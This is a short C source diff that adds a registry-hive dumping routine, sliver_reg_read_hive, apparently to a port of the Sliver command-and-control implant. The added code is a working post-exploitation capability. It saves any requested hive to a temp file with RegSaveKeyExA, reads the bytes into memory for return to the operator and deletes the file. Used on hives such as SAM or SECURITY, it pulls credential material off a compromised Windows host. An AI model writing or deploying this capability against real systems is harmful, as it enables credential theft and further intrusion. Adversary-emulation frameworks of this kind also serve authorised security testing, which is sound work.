@@ -237,3 +237,63 @@ int sliver_reg_values(const char *hive, const char *path, char (*names)[256], in
   return count;
 }
 
+
+/* Dumps a hive to a temporary file and returns its bytes (RegistryReadHive). */
+int sliver_reg_read_hive(const char *root_hive, const char *requested_hive, uint8_t **out,
+                         size_t *out_len) {
+  HKEY root = hive_from_name(root_hive);
+  char temp_dir[MAX_PATH];
+  char temp_file[MAX_PATH];
+  DWORD got = 0;
+  FILE *f = NULL;
+  long size;
+  uint8_t *buf = NULL;
+
+  if (root == NULL || out == NULL || out_len == NULL) {
+    return -1;
+  }
+  got = GetTempPathA(MAX_PATH, temp_dir);
+  if (got == 0 || got >= MAX_PATH) {
+    return -1;
+  }
+  (void)snprintf(temp_file, sizeof(temp_file), "%ssliver-hive-%lu.dat", temp_dir,
+                 (unsigned long)GetCurrentProcessId());
+  (void)DeleteFileA(temp_file);
+  /* Requires SeBackupPrivilege; a normal user gets ERROR_PRIVILEGE_NOT_HELD (1314). */
+  if (RegSaveKeyExA(root, temp_file, NULL, REG_LATEST_FORMAT) != ERROR_SUCCESS) {
+    LOG_DEBUG("registry: RegSaveKeyEx(%s\\%s) failed (%lu)", root_hive,
+              requested_hive != NULL ? requested_hive : "",
+              (unsigned long)GetLastError());
+    return -1;
+  }
+  f = fopen(temp_file, "rb");
+  if (f == NULL) {
+    (void)DeleteFileA(temp_file);
+    return -1;
+  }
+  (void)fseek(f, 0, SEEK_END);
+  size = ftell(f);
+  (void)fseek(f, 0, SEEK_SET);
+  if (size <= 0 || size > (32 * 1024 * 1024)) {
+    (void)fclose(f);
+    (void)DeleteFileA(temp_file);
+    return -1;
+  }
+  buf = (uint8_t *)malloc((size_t)size);
+  if (buf == NULL) {
+    (void)fclose(f);
+    (void)DeleteFileA(temp_file);
+    return -1;
+  }
+  if (fread(buf, 1, (size_t)size, f) != (size_t)size) {
+    free(buf);
+    (void)fclose(f);
+    (void)DeleteFileA(temp_file);
+    return -1;
+  }
+  (void)fclose(f);
+  (void)DeleteFileA(temp_file);
+  *out = buf;
+  *out_len = (size_t)size;
+  return 0;
+}
